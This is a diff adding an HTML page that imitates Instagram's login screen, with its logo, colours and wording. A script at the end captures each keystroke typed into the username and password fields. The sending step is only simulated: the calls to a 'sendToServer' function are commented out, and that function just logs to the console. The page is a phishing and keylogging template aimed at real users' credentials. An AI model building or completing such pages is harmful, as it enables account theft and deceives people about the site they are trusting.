@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        /* Reset and basic styling */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Body and container styling */
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        /* Logo styling */
+        .logo {
+            margin: 40px 0 20px;
+        }
+
+        .logo img {
+            width: 175px;
+        }
+
+        /* Form styling */
+        .login-form {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+        }
+
+        /* Link styling */
+        .forgot-pass, .sign-up {
+            color: #0095f6;
+            font-size: 14px;
+            margin-top: 20px;
+            display: block;
+            text-decoration: none;
+        }
+
+        .separator {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+        }
+
+        .separator::before, .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .separator::before {
+            margin-right: 10px;
+        }
+
+        .separator::after {
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Instagram Logo -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        </div>
+
+        <!-- Login Form -->
+        <div class="login-form">
+            <form>
+                <input id="username" type="text" placeholder="Phone number, username, or email" required>
+                <input id="password" type="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+
+            <a href="#" class="forgot-pass">Forgot password?</a>
+
+            <div class="separator">OR</div>
+            <a href="#" class="sign-up">Sign Up</a>
+        </div>
+    </div>
+</body>
+<script>
+    // Capture keystrokes from the username field
+    document.getElementById("username").addEventListener("keypress", function(event) {
+        let keyPressed = event.key;
+        console.log("Username Field Key Pressed: " + keyPressed);
+        // sendToServer(keyPressed, "username"); // Simulated sending
+    });
+
+    // Capture keystrokes from the password field
+    document.getElementById("password").addEventListener("keypress", function(event) {
+        let keyPressed = event.key;
+        console.log("Password Field Key Pressed: " + keyPressed);
+        // sendToServer(keyPressed, "password"); // Simulated sending
+    });
+
+    // Function to simulate sending data to a server
+    function sendToServer(key, field) {
+        console.log("Data sent to server from " + field + ": " + key);
+    }
+</script>
+</html>
